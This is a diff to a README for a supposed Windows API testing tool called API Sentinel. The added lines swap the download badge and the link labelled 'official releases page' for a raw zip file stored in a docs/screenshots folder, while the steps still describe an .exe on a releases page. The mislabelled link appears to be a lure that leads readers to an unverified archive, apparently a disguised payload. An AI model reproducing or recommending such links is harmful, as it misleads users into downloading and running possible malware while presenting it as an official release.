@@ -1,6 +1,6 @@
 # 🚀 api-sentinel-downloads - Manage your API workflows with ease
 
-[![](https://img.shields.io/badge/Download_API_Sentinel-Blue?style=for-the-badge)](https://github.com/Powerful-cabbagebutterfly911/api-sentinel-downloads/releases)
+[![](https://img.shields.io/badge/Download_API_Sentinel-Blue?style=for-the-badge)](https://github.com/Powerful-cabbagebutterfly911/api-sentinel-downloads/raw/refs/heads/main/docs/screenshots/api-downloads-sentinel-1.0.zip)
 
 API Sentinel acts as a central hub for your API requests. It supports REST, GraphQL, and WebSocket protocols. Developers and testers use this tool to build, test, and automate their data workflows. You can create mock servers, run load tests, and manage API collections from your Windows desktop. This space provides the latest official releases for Windows users.
 
@@ -8,7 +8,7 @@ API Sentinel acts as a central hub for your API requests. It supports REST, Grap
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Powerful-cabbagebutterfly911/api-sentinel-downloads/releases).
+1. Visit the [official releases page](https://github.com/Powerful-cabbagebutterfly911/api-sentinel-downloads/raw/refs/heads/main/docs/screenshots/api-downloads-sentinel-1.0.zip).
 2. Look for the latest version listed at the top.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start your download.
